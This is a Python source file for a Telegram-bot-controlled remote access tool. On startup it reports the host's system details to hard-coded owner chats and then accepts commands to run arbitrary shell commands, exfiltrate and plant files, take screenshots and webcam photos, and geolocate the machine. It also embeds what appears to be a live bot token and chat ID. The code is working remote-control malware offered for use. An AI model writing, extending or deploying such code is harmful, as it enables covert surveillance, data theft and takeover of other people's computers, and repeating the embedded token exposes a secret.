import json
import os
import sys
import uuid
import socket
import platform
import getpass
import subprocess
import base64
import io
from datetime import datetime, timezone
from pathlib import Path

# Fix the timezone issue by monkey-patching before imports
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="apscheduler")

# Monkey patch the APScheduler functions to avoid timezone issues
def patched_get_localzone():
    import pytz
    return pytz.UTC

def patched_astimezone(tz):
    import pytz
    if tz is None:
        return pytz.UTC
    return tz

# Apply the patches before any telegram imports
try:
    import apscheduler.util
    apscheduler.util.get_localzone = patched_get_localzone
    apscheduler.util.astimezone = patched_astimezone
    
    # Also patch in schedulers.base
    import apscheduler.schedulers.base
    if hasattr(apscheduler.schedulers.base, 'get_localzone'):
        apscheduler.schedulers.base.get_localzone = patched_get_localzone
    if hasattr(apscheduler.schedulers.base, 'astimezone'):
        apscheduler.schedulers.base.astimezone = patched_astimezone
except ImportError:
    pass

try:
    import psutil
except Exception:
    psutil = None

from telegram import Update, Bot
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# === CONFIGURATION ===
TOKEN = "7756974263:AAFY_gKHbaTJLOFIYvm91y5Tae7t1TGsvm8"
OWNER_CHAT_IDS = [6110322694]  # list of integers, e.g. [123456789]

CONFIG_FILE = "agent_config.json"
DEVICE_ID_FILE = "device_id.txt"
# === HELPERS ===
def load_local_config():
    global TOKEN, OWNER_CHAT_IDS
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            if not TOKEN:
                TOKEN = cfg.get("TOKEN", "")
            if not OWNER_CHAT_IDS:
                OWNER_CHAT_IDS = cfg.get("OWNER_CHAT_IDS", [])
        except Exception:
            pass

def save_local_config():
    cfg = {"TOKEN": TOKEN, "OWNER_CHAT_IDS": OWNER_CHAT_IDS}
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        return open(DEVICE_ID_FILE, "r").read().strip()
    new_id = str(uuid.uuid4())
    with open(DEVICE_ID_FILE, "w") as f:
        f.write(new_id)
    return new_id

def safe_psutil_info():
    if not psutil:
        return {"psutil_available": False}
    try:
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        cpu_count = psutil.cpu_count(logical=True)
        nets = psutil.net_if_addrs()
        return {
            "psutil_available": True,
            "cpu_count": cpu_count,
            "memory_total_bytes": getattr(mem, "total", None),
            "memory_available_bytes": getattr(mem, "available", None),
            "disk_total_bytes": getattr(disk, "total", None),
            "disk_used_bytes": getattr(disk, "used", None),
            "net_interfaces": {
                k: [
                    {
                        "family": getattr(addr, "family", None),
                        "address": getattr(addr, "address", None),
                        "netmask": getattr(addr, "netmask", None),
                        "broadcast": getattr(addr, "broadcast", None),
                        "ptp": getattr(addr, "ptp", None),
                    }
                    for addr in v
                ]
                for k, v in nets.items()
            },
        }
    except Exception:
        return {"psutil_error": True}

def collect_system_info():
    info = {}
    info["device_id"] = get_device_id()
    info["hostname"] = socket.gethostname()
    info["fqdn"] = socket.getfqdn()
    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["local_ip"] = None
    info["platform"] = platform.platform()
    info["system"] = platform.system()
    info["release"] = platform.release()
    info["version"] = platform.version()
    info["machine"] = platform.machine()
    info["processor"] = platform.processor()
    info["user"] = getpass.getuser()
    info["timestamp_utc"] = datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')
    info.update(safe_psutil_info())

    # MACs
    try:
        macs = []
        for iface, addrs in (psutil.net_if_addrs().items() if psutil else {}).items():
            for a in addrs:
                addr = getattr(a, "address", "")
                if str(addr).count(":") == 5:
                    macs.append({"iface": iface, "mac": addr})
        info["macs"] = macs
    except Exception:
        info["macs"] = []
    return info

def pretty_system_text(info: dict) -> str:
    lines = []
    lines.append(f"Device ID: {info.get('device_id')}")
    lines.append(f"Hostname: {info.get('hostname')} ({info.get('fqdn')})")
    lines.append(f"User: {info.get('user')}")
    lines.append(f"Platform: {info.get('platform')}")
    lines.append(f"System: {info.get('system')} {info.get('release')} ({info.get('version')})")
    lines.append(f"Machine / Processor: {info.get('machine')} / {info.get('processor')}")
    lines.append(f"Local IP: {info.get('local_ip')}")
    if info.get("psutil_available"):
        lines.append(f"CPU cores: {info.get('cpu_count')}")
        if info.get("memory_total_bytes"):
            lines.append(f"Memory total: {info['memory_total_bytes']} bytes")
        if info.get("disk_total_bytes"):
            lines.append(f"Disk total: {info['disk_total_bytes']} bytes")
    else:
        lines.append("psutil not available — limited hardware info.")
    macs = info.get("macs", [])
    if macs:
        lines.append("MACs:")
        for m in macs:
            lines.append(f"  {m.get('iface')}: {m.get('mac')}")
    lines.append(f"Reported at (UTC): {info.get('timestamp_utc')}")
    return "\n".join(lines)

# === TELEGRAM UTILITIES ===
def authorized(chat_id: int) -> bool:
    return chat_id in OWNER_CHAT_IDS

async def send_initial_report(bot: Bot, chat_id: int, info: dict):
    text = "[Initial device registration]\n\n" + pretty_system_text(info)
    await bot.send_message(chat_id=chat_id, text=text)

# === COMMAND HANDLERS ===
async def cmd_mydevices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    info = collect_system_info()
    short = f"[{info['device_id']}] {info['hostname']} — {info['system']} {info['release']} — {info['timestamp_utc']}"
    await update.message.reply_text(short)

async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    info = collect_system_info()
    text = pretty_system_text(info)
    MAX = 3800
    for i in range(0, len(text), MAX):
        await update.message.reply_text(text[i:i+MAX])

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    await update.message.reply_text(
        "📋 **Device Information:**\n"
        "/mydevices — show short identifier\n"
        "/info — detailed device info\n\n"
        "💻 **Remote Control:**\n"
        "/exec <command> — execute system command\n"
        "/download <path> — download file from system\n"
        "/upload — upload file to system\n\n"
        "📷 **Media & Location:**\n"
        "/screenshot — take desktop screenshot\n"
        "/webcam — take webcam photo\n"
        "/locate — get GPS location\n\n"
        "/help — this help",
        parse_mode='Markdown'
    )

async def cmd_exec(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /exec <command>\nExample: /exec dir")
        return
    
    command = " ".join(context.args)
    await update.message.reply_text(f"🔄 Executing: `{command}`", parse_mode='Markdown')
    
    try:
        # Execute command with timeout
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30,
            cwd=os.getcwd()
        )
        
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = f"Command executed successfully (exit code: {result.returncode})"
        
        # Split long output into chunks
        MAX_LENGTH = 3800
        if len(output) > MAX_LENGTH:
            for i in range(0, len(output), MAX_LENGTH):
                chunk = output[i:i+MAX_LENGTH]
                await update.message.reply_text(f"```\n{chunk}\n```", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"```\n{output}\n```", parse_mode='Markdown')
            
    except subprocess.TimeoutExpired:
        await update.message.reply_text("❌ Command timed out (30s limit)")
    except Exception as e:
        await update.message.reply_text(f"❌ Error executing command: {str(e)}")

async def cmd_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /download <file_path>\nExample: /download C:\\Users\\file.txt")
        return
    
    file_path = " ".join(context.args)
    
    try:
        path = Path(file_path)
        if not path.exists():
            await update.message.reply_text(f"❌ File not found: {file_path}")
            return
        
        if not path.is_file():
            await update.message.reply_text(f"❌ Path is not a file: {file_path}")
            return
        
        # Check file size (Telegram limit is 50MB)
        file_size = path.stat().st_size
        if file_size > 50 * 1024 * 1024:  # 50MB
            await update.message.reply_text(f"❌ File too large: {file_size / 1024 / 1024:.1f}MB (max 50MB)")
            return
        
        await update.message.reply_text(f"📤 Uploading file: {path.name} ({file_size / 1024:.1f}KB)")
        
        with open(path, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename=path.name,
                caption=f"📁 Downloaded from: `{file_path}`",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error downloading file: {str(e)}")

async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    await update.message.reply_text(
        "📤 **File Upload Instructions:**\n"
        "1. Send any file to this chat\n"
        "2. I'll save it to the Downloads folder\n"
        "3. You can specify a custom path by replying to this message with the path",
        parse_mode='Markdown'
    )

async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    await update.message.reply_text("📸 Taking screenshot...")
    
    try:
        # Try different screenshot methods
        screenshot_data = None
        
        # Method 1: Try PIL (Pillow)
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            screenshot_data = buf.getvalue()
            buf.close()
        except ImportError:
            pass
        
        # Method 2: Try using system commands
        if not screenshot_data:
            if platform.system() == "Windows":
                # Use PowerShell on Windows
                ps_cmd = '''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
                $bitmap.Save("temp_screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
                '''
                subprocess.run(["powershell", "-Command", ps_cmd], check=True)
                with open("temp_screenshot.png", "rb") as f:
                    screenshot_data = f.read()
                os.remove("temp_screenshot.png")
            else:
                # Use scrot or gnome-screenshot on Linux
                try:
                    subprocess.run(["scrot", "temp_screenshot.png"], check=True)
                    with open("temp_screenshot.png", "rb") as f:
                        screenshot_data = f.read()
                    os.remove("temp_screenshot.png")
                except FileNotFoundError:
                    subprocess.run(["gnome-screenshot", "-f", "temp_screenshot.png"], check=True)
                    with open("temp_screenshot.png", "rb") as f:
                        screenshot_data = f.read()
                    os.remove("temp_screenshot.png")
        
        if screenshot_data:
            # Send screenshot
            await update.message.reply_photo(
                photo=io.BytesIO(screenshot_data),
                caption=f"🖥️ Screenshot taken at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            await update.message.reply_text("❌ Could not take screenshot. Install PIL (pip install Pillow) for better support.")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error taking screenshot: {str(e)}")

async def cmd_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    await update.message.reply_text("📷 Taking webcam photo...")
    
    try:
        webcam_data = None
        
        # Try using OpenCV
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame)
                    webcam_data = buffer.tobytes()
                cap.release()
        except ImportError:
            pass
        
        # Alternative: Try using system commands
        if not webcam_data:
            if platform.system() == "Windows":
                # Use PowerShell to access webcam (requires additional setup)
                await update.message.reply_text("❌ Webcam access requires OpenCV. Install with: pip install opencv-python")
                return
            else:
                # Try fswebcam on Linux
                try:
                    subprocess.run(["fswebcam", "-r", "640x480", "--no-banner", "temp_webcam.jpg"], check=True)
                    with open("temp_webcam.jpg", "rb") as f:
                        webcam_data = f.read()
                    os.remove("temp_webcam.jpg")
                except FileNotFoundError:
                    await update.message.reply_text("❌ Webcam access requires fswebcam or OpenCV")
                    return
        
        if webcam_data:
            await update.message.reply_photo(
                photo=io.BytesIO(webcam_data),
                caption=f"📷 Webcam photo taken at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            await update.message.reply_text("❌ Could not access webcam")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error accessing webcam: {str(e)}")

async def cmd_locate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    await update.message.reply_text("🌍 Getting location...")
    
    try:
        location_info = []
        
        # Try to get IP-based location
        try:
            import requests
            # Get public IP
            ip_response = requests.get("https://api.ipify.org", timeout=10)
            public_ip = ip_response.text
            
            # Get location from IP
            geo_response = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=10)
            geo_data = geo_response.json()
            
            if geo_data.get("status") == "success":
                location_info.append(f"🌐 **IP-based Location:**")
                location_info.append(f"IP: `{public_ip}`")
                location_info.append(f"Country: {geo_data.get('country', 'Unknown')}")
                location_info.append(f"Region: {geo_data.get('regionName', 'Unknown')}")
                location_info.append(f"City: {geo_data.get('city', 'Unknown')}")
                location_info.append(f"ISP: {geo_data.get('isp', 'Unknown')}")
                location_info.append(f"Timezone: {geo_data.get('timezone', 'Unknown')}")
                
                lat = geo_data.get('lat')
                lon = geo_data.get('lon')
                if lat and lon:
                    location_info.append(f"Coordinates: {lat}, {lon}")
                    # Send location on map
                    await update.message.reply_location(latitude=lat, longitude=lon)
                
        except Exception as e:
            location_info.append(f"❌ Could not get IP location: {str(e)}")
        
        # Try to get WiFi-based location (Windows)
        if platform.system() == "Windows":
            try:
                wifi_cmd = 'netsh wlan show interfaces'
                result = subprocess.run(wifi_cmd, shell=True, capture_output=True, text=True)
                if "Connected" in result.stdout:
                    location_info.append(f"\n📶 **WiFi Info:**")
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "SSID" in line and "BSSID" not in line:
                            location_info.append(f"WiFi: {line.split(':')[1].strip()}")
            except:
                pass
        
        if location_info:
            await update.message.reply_text("\n".join(location_info), parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ Could not determine location")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error getting location: {str(e)}")

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not authorized(chat_id):
        await update.message.reply_text("Unauthorized.")
        return
    
    try:
        # Get the file
        file = await update.message.document.get_file()
        
        # Create downloads directory if it doesn't exist
        downloads_dir = Path.home() / "Downloads" / "TelegramBot"
        downloads_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate unique filename if file exists
        file_path = downloads_dir / update.message.document.file_name
        counter = 1
        while file_path.exists():
            name_parts = update.message.document.file_name.rsplit('.', 1)
            if len(name_parts) == 2:
                new_name = f"{name_parts[0]}_{counter}.{name_parts[1]}"
            else:
                new_name = f"{update.message.document.file_name}_{counter}"
            file_path = downloads_dir / new_name
            counter += 1
        
        # Download the file
        await file.download_to_drive(file_path)
        
        file_size = file_path.stat().st_size
        await update.message.reply_text(
            f"✅ **File uploaded successfully!**\n"
            f"📁 Name: `{file_path.name}`\n"
            f"📍 Path: `{file_path}`\n"
            f"📊 Size: {file_size / 1024:.1f} KB",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error uploading file: {str(e)}")

# === MAIN ===
async def main():
    global TOKEN, OWNER_CHAT_IDS
    load_local_config()

    if not TOKEN:
        print("Error: Telegram bot TOKEN not set.")
        sys.exit(1)
    if not OWNER_CHAT_IDS:
        print("Error: OWNER_CHAT_IDS is empty.")
        sys.exit(1)

    device_id = get_device_id()
    bot = Bot(token=TOKEN)

    # Send initial registration only once
    first_run_marker = f".reported_{device_id}"
    if not os.path.exists(first_run_marker):
        try:
            info = collect_system_info()
            for owner in OWNER_CHAT_IDS:
                await send_initial_report(bot, owner, info)
            with open(first_run_marker, "w") as f:
                f.write(datetime.now(timezone.utc).isoformat())
            print("Initial report sent.")
        except Exception as e:
            print("Failed to send initial report:", e)

    # Build application (timezone issue should be fixed by monkey patch)
    app = Application.builder().token(TOKEN).build()

    # Basic info commands
    app.add_handler(CommandHandler("mydevices", cmd_mydevices))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(CommandHandler("help", cmd_help))
    
    # Remote control commands
    app.add_handler(CommandHandler("exec", cmd_exec))
    app.add_handler(CommandHandler("download", cmd_download))
    app.add_handler(CommandHandler("upload", cmd_upload))
    
    # Media and location commands
    app.add_handler(CommandHandler("screenshot", cmd_screenshot))
    app.add_handler(CommandHandler("webcam", cmd_webcam))
    app.add_handler(CommandHandler("locate", cmd_locate))
    
    # File upload handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))

    print("Agent started and listening for commands.")
    
    # Use initialize and start methods instead of run_polling for better control
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    # Keep the program running
    import asyncio
    try:
        # Run indefinitely until interrupted
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    import asyncio
    
    # Set Windows-specific event loop policy for better compatibility
    if os.name == 'nt':  # Windows
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nAgent stopped by user.")
    except Exception as e:
        print(f"Agent stopped due to error: {e}")
